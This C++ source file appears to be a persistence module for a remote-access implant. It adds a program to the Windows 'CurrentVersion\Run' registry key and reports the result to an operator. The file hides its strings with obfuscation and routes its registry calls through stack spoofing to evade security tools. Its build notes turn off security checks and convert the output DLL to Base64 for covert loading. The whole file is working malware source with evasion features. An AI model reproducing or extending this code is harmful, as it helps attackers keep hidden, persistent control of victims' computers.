#include <iostream>
#include <windows.h>
#include "CLite.h"
#include "Obfuscator.h"
#include "StackSpoofer.h"

/*
* ⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️
* 1.Release x64
* 2.常规: 平台工具集(LLVM (clang-cl))
* 3.C/C++
* 优化: 优化(已禁用)
* 代码生成: 启用 C++ 异常(否); 运行库(多线程); 安全检查(禁用安全检查)
* 4.链接器
* 输入: 附加依赖项(Stub.lib); 忽略所有默认库(是)
* 清单文件: 生成清单(否)
* 调试: 生成调试信息(否)
* 高级: 入口点(RegStartup)
* 5.生成事件
* 生成后事件: 命令行(powershell -Command "[Convert]::ToBase64String([IO.File]::ReadAllBytes('$(OutDir)$(TargetFileName)')) | Out-File '$(OutDir)$(TargetName)_Base64.txt' -Encoding UTF8; Remove-Item '$(OutDir)$(TargetFileName)'")
*/

using namespace std;

// 注册表启动项
extern "C" __declspec(dllexport) void RegStartup(char* argv[]) {
    char* id = argv[0];
    char* username = argv[1];
    size_t len;
    wchar_t* name = StrToWStr(argv[2], &len);
    if (name == NULL) {
        return;
    }
    size_t pathLen;
    wchar_t* path = StrToWStr(argv[3], &pathLen);
    if (path == NULL) {
        goto End;
    }
    HKEY hKey;
    int success = 0;
    char* startupKey = OBFSTR("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    if (SPOOF(RegOpenKeyExA, 5, HKEY_CURRENT_USER, startupKey, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        if (SPOOF(RegSetValueExW, 6, hKey, name, 0, REG_SZ, (PBYTE)path, (pathLen + 1) * sizeof(wchar_t)) == ERROR_SUCCESS) {
            success = 1;
            AsyncCommandOutput(id, username, OBFSTR("[+] RegStartup: "), NULL);
        }
        SPOOF(RegCloseKey, 1, hKey);
    }
    if (!success) {
        AsyncCommandOutput(id, username, OBFSTR("[-] RegStartup: "), NULL);
    }
    argv[2][StrLen(argv[2])] = ' ';
    AsyncCommandOutput(id, username, argv[2], NULL);
End:
    SafeFree(name);
    SafeFree(path);
}

#ifdef _DEBUG
int main() {
    char paras[] = "name\0path";
    char* argv[] = { "id", "Magician", paras, paras + strlen(paras) + 1 };
    RegStartup(argv);
}
#endif